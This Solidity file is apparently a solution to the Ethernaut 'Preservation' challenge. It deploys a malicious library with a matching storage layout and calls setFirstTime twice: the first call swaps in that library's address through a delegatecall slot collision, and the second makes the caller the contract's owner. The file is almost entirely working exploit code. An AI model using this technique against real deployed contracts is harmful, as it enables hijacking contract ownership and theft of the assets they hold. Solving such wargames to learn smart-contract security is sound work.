// SPDX-License-Identifier: MIT

pragma solidity ^0.7.0;

import "hardhat/console.sol";

/*
 * I am not sure I fully understand how this one works yet. 
 */


interface Preservation {
    function setFirstTime(uint _timeStamp) external;
}

contract PreservationAttackLibrary {
    // needs same storage layout as Preservation, i.e.,
    // we want owner at slot index 2
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint /* _time */) public {
        owner = tx.origin;
    }
}

contract PreservationAttack {
    Preservation public challenge;
    PreservationAttackLibrary public detour;

    constructor(address challengeAddress) {
        challenge = Preservation(challengeAddress);
        detour = new PreservationAttackLibrary();
    }

    function attack() public {
        //console.log("attack(), sender = ", msg.sender);
        // 
        challenge.setFirstTime(uint256(address(detour)));

        challenge.setFirstTime(0);
    }

}